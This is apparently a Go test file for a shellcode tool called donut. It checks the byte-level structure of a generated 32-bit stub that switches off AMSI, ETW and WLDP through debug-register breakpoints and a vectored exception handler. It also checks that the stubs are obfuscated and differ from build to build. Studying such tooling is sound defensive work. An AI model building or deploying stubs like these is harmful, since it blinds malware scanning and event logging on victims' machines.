package donut

import (
	"bytes"
	"encoding/binary"
	"strings"
	"testing"
)

func TestGenerateEvadeStub32_Decodes(t *testing.T) {
	variants := []EvadeOptions{
		{Amsi: true}, {Etw: true}, {Wldp: true},
		{Amsi: true, Etw: true}, {Amsi: true, Wldp: true},
		{Etw: true, Wldp: true}, {Amsi: true, Etw: true, Wldp: true},
	}
	for i := 0; i < 25; i++ {
		stub, meta, err := GenerateEvadeStub32(variants[i%len(variants)])
		if err != nil {
			t.Fatalf("iteration %d: %v", i, err)
		}
		if len(stub) == 0 || meta.Size != len(stub) {
			t.Fatalf("iteration %d: size mismatch: len=%d meta=%d", i, len(stub), meta.Size)
		}
		if got := len(disassembleAll32(t, stub, 0x400000)); got < 60 {
			t.Fatalf("iteration %d: suspiciously short stream: %d instructions", i, got)
		}
	}
}

func TestGenerateEvadeStub32_ContractAndContext(t *testing.T) {
	stub, meta, err := GenerateEvadeStub32(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(stub[:5], []byte{0x55, 0x89, 0xe5, 0x9c, 0x60}) {
		t.Fatalf("stub does not begin with balanced EBP/PUSHFD/PUSHAD frame: % x", stub[:5])
	}
	if !bytes.Contains(stub, []byte{0x64, 0xa1, 0x30, 0, 0, 0}) {
		t.Fatal("no fs:[0x30] PEB access")
	}
	if !bytes.Contains(stub, []byte{0x8b, 0x40, 0x0c, 0x8d, 0x50, 0x14, 0x8b, 0x02}) {
		t.Fatal("native x86 PEB/LDR offsets absent")
	}
	if !bytes.Contains(stub, []byte{0xc7, 0x07, 0x10, 0x00, 0x01, 0x00}) {
		t.Fatal("CONTEXT_i386_DEBUG_REGISTERS 0x00010010 not written at offset zero")
	}
	if bytes.Count(stub, []byte{0x6a, 0xfe}) < 2 {
		t.Fatal("Get/SetThreadContext do not both use pseudo-handle -2")
	}
	// Native x86 CONTEXT debug offsets are encoded in the DR stores.
	for _, off := range []byte{ctx32Dr0, ctx32Dr1, ctx32Dr2, ctx32Dr3, ctx32Dr7} {
		if !bytes.Contains(stub, []byte{0x89, 0x47, off}) && off != ctx32Dr7 {
			t.Fatalf("DR offset %#x is not armed", off)
		}
	}
	if !bytes.Contains(stub[meta.HandlerOffset:], []byte{0x04, 0x00, 0x00, 0x80}) {
		t.Fatal("VEH handler does not check EXCEPTION_SINGLE_STEP")
	}
	if !bytes.Contains(stub[meta.HandlerOffset:], []byte{0xb8, 0xff, 0xff, 0xff, 0xff}) {
		t.Fatal("VEH handler has no EXCEPTION_CONTINUE_EXECUTION return")
	}
	if !bytes.Contains(stub[meta.HandlerOffset:], []byte{0x31, 0xc0, 0xc2, 0x04, 0x00}) {
		t.Fatal("VEH pass path is not a stdcall return of zero")
	}

	// AddVectoredExceptionHandler call [ebp-0x34] must precede the final
	// SetThreadContext call [ebp-0x30].
	addCall := bytes.LastIndex(stub[:meta.HandlerOffset], []byte{0xff, 0x55, 0xcc})
	setCall := bytes.LastIndex(stub[:meta.HandlerOffset], []byte{0xff, 0x55, 0xd0})
	if addCall < 0 || setCall < 0 || addCall >= setCall {
		t.Fatalf("VEH-first ordering violated: AddVEH=%d SetTC=%d", addCall, setCall)
	}

	// The main and fail exits both restore PUSHAD/PUSHFD and jump onward.
	restore := []byte{0x8d, 0x65, 0xdc, 0x61, 0x9d, 0x89, 0xec, 0x5d, 0xe9}
	if bytes.Count(stub[:meta.HandlerOffset], restore) != 2 {
		t.Fatal("main/fail balanced restore+jump sequences are incomplete")
	}
}

func TestGenerateEvadeStub32_StdcallReturnGadgets(t *testing.T) {
	stub, meta, err := GenerateEvadeStub32(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
	if err != nil {
		t.Fatal(err)
	}
	h := stub[meta.HandlerOffset:]
	// AmsiScanBuffer(6), AmsiScanString(5), NtTraceEvent(4), and
	// WldpIsClassInApprovedList(4) each get a real ret imm16 gadget.
	if bytes.Count(h, []byte{0xc2, 0x18, 0x00}) != 1 {
		t.Fatal("AmsiScanBuffer ret 0x18 gadget missing or duplicated")
	}
	if bytes.Count(h, []byte{0xc2, 0x14, 0x00}) != 1 {
		t.Fatal("AmsiScanString ret 0x14 gadget missing or duplicated")
	}
	if bytes.Count(h, []byte{0xc2, 0x10, 0x00}) != 2 {
		t.Fatal("NtTraceEvent/WLDP ret 0x10 gadgets missing")
	}
}

func TestGenerateEvadeStub32_NoPlaintextModuleOrExportNames(t *testing.T) {
	needles := []string{
		"amsi.dll", "wldp.dll", "kernel32.dll", "ntdll.dll",
		"AmsiScanBuffer", "AmsiScanString", "NtTraceEvent",
		"WldpIsClassInApprovedList", "LoadLibraryA", "GetThreadContext",
		"SetThreadContext", "RtlAddVectoredExceptionHandler",
	}
	for i := 0; i < 20; i++ {
		stub, _, err := GenerateEvadeStub32(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
		if err != nil {
			t.Fatal(err)
		}
		lower := strings.ToLower(string(stub))
		for _, needle := range needles {
			if strings.Contains(lower, strings.ToLower(needle)) {
				t.Fatalf("iteration %d: plaintext %q leaked into stub", i, needle)
			}
		}
	}
}

func TestGenerateEvadeStub32_Uniqueness(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 30; i++ {
		stub, _, err := GenerateEvadeStub32(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
		if err != nil {
			t.Fatal(err)
		}
		seen[string(stub[:min(256, len(stub))])] = true
	}
	if len(seen) < 20 {
		t.Fatalf("only %d distinct prefixes over 30 builds", len(seen))
	}
}

func TestPatchEvadeJmp32(t *testing.T) {
	stub, meta, err := GenerateEvadeStub32(EvadeOptions{Amsi: true, Etw: true, Wldp: true})
	if err != nil {
		t.Fatal(err)
	}
	target := len(stub) + 73
	if err := PatchEvadeJmp32(stub, meta, target); err != nil {
		t.Fatal(err)
	}
	for _, off := range []int{meta.JmpOffset, meta.FailJmpOffset} {
		got := int32(binary.LittleEndian.Uint32(stub[off : off+4]))
		want := int32(target - (off + 4))
		if got != want {
			t.Fatalf("jmp at %d: displacement=%d want=%d", off, got, want)
		}
	}
}

func TestGenerateEvadeStub32_LoadLibraryUsesBufferBaseAndByteReads(t *testing.T) {
	stub, meta, err := GenerateEvadeStub32(EvadeOptions{Amsi: true, Wldp: true})
	if err != nil {
		t.Fatal(err)
	}
	insns := disassembleAll32(t, stub[:meta.HandlerOffset], 0x400000)
	loadCalls := 0
	for i, in := range insns {
		if !strings.EqualFold(in.Op.String(), "call") || !strings.Contains(gnu(in), "-0x28(%ebp)") {
			continue
		}
		loadCalls++
		if i < 2 || !strings.EqualFold(insns[i-1].Op.String(), "push") || !strings.Contains(gnu(insns[i-1]), "%esi") {
			t.Fatalf("LoadLibraryA call %d does not receive ESI: %q", loadCalls, gnu(insns[i-1]))
		}
		if !strings.EqualFold(insns[i-2].Op.String(), "lea") || !strings.Contains(gnu(insns[i-2]), "-0x70(%ebp),%esi") {
			t.Fatalf("LoadLibraryA call %d receives post-increment pointer; preceding instruction is %q", loadCalls, gnu(insns[i-2]))
		}

		loopStart := -1
		for j := i - 3; j >= 0; j-- {
			if strings.EqualFold(insns[j].Op.String(), "lea") && strings.Contains(gnu(insns[j]), "-0x70(%ebp),%esi") {
				loopStart = j
				break
			}
		}
		if loopStart < 0 {
			t.Fatalf("LoadLibraryA call %d has no decoder base", loadCalls)
		}
		foundBound, foundByteRead, foundIncrement := false, false, false
		for _, decoderInsn := range insns[loopStart+1 : i-2] {
			s := gnu(decoderInsn)
			switch {
			case strings.EqualFold(decoderInsn.Op.String(), "cmp") && strings.Contains(s, "$0x18") && strings.Contains(s, "%edi"):
				foundBound = true
			case strings.EqualFold(decoderInsn.Op.String(), "movzx") && strings.Contains(s, "(%esi),%eax"):
				foundByteRead = true
			case strings.EqualFold(decoderInsn.Op.String(), "inc") && strings.Contains(s, "%esi"):
				foundIncrement = true
			}
		}
		if !foundBound || !foundByteRead || !foundIncrement {
			t.Fatalf("LoadLibraryA decoder %d does not prove 24 bounded single-byte reads: bound=%v byteRead=%v increment=%v",
				loadCalls, foundBound, foundByteRead, foundIncrement)
		}
	}
	if loadCalls != 2 {
		t.Fatalf("decoded LoadLibraryA calls=%d want 2", loadCalls)
	}
}
